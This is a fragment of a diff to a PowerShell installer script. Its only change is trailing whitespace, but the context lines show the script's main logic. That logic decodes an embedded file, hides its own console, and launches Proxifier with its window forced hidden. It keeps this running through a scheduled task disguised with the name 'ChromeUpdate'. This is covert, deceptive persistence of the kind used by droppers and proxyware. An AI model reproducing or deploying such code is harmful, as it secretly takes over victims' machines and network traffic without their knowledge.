@@ -83,4 +83,4 @@ Base64ToFile $def_file 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5k
 $p_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -FilePath \`"$p\`";while(![native.win]::ShowWindow(([System.Diagnostics.Process]::GetProcessesByName(\`"proxifier\`") | Get-Process).MainWindowHandle, 0)){}`"";
 AddTask 'ChromeUpdate' 'PowerShell.exe' $p_cmd;
 }
-InstallTP
+InstallTP 
